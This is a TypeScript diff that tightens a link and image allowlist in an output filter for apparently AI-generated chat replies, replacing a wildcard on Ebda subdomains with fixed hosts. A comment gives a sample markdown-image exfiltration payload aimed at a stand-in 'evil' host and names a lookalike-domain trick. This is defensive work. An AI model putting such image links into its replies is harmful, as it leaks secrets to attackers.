@@ -1,6 +1,7 @@
 /**
- * Output rail 12: link and image allowlist (plan 4 Task A9, gap 4). A reply may link only to `https` pages on `ebda.app` and its
- * subdomains and to the merchant's own domains (no userinfo, no port, no lookalike suffix such as `ebda.app.evil.com`). Everything else
+ * Output rail 12: link and image allowlist (plan 4 Task A9, gap 4). A reply may link only to `https` pages on Ebda's own FIXED
+ * hosts (exact list below, NOT `*.ebda.app`: merchants own subdomains there, so a wildcard would trust attacker pages) and to the merchant's
+ * own domains as the adapter lists them (no userinfo, no port, no lookalike suffix such as `ebda.app.evil.com`). Everything else
  * is reduced to plain text, and markdown images are dropped to their alt text: an image URL is a data-exfiltration channel
  * (`![x](https://evil/p?d=<secret>)`), and `data:` / `javascript:` targets never survive.
  */
@@ -12,6 +13,9 @@ const TRAIL = /[.,;:!?)،؛]+$/;
 
 const hostOf = (d: string): string => d.trim().toLowerCase().replace(/^[a-z]+:\/\//, '').replace(/[/:?#].*$/, '').replace(/\.$/, '');
 
+/** Hosts Ebda itself serves (exact match). Add a host here only when Ebda, not a tenant, controls everything on it. */
+export const EBDA_HOSTS: readonly string[] = ['ebda.app', 'help.ebda.app', 'whatsapp.ebda.app'];
+
 export function isAllowedUrl(href: string, merchantDomains: string[]): boolean {
   let u: URL;
   try {
@@ -22,7 +26,7 @@ export function isAllowedUrl(href: string, merchantDomains: string[]): boolean {
   if (u.protocol !== 'https:' || u.username || u.password || u.port) return false;
   const host = u.hostname.toLowerCase().replace(/\.$/, '');
   const ok = (d: string): boolean => host === d || host.endsWith(`.${d}`);
-  return ok('ebda.app') || merchantDomains.map(hostOf).filter(Boolean).some(ok);
+  return EBDA_HOSTS.includes(host) || merchantDomains.map(hostOf).filter(Boolean).some(ok);
 }
 
 const origin = (href: string): string => {
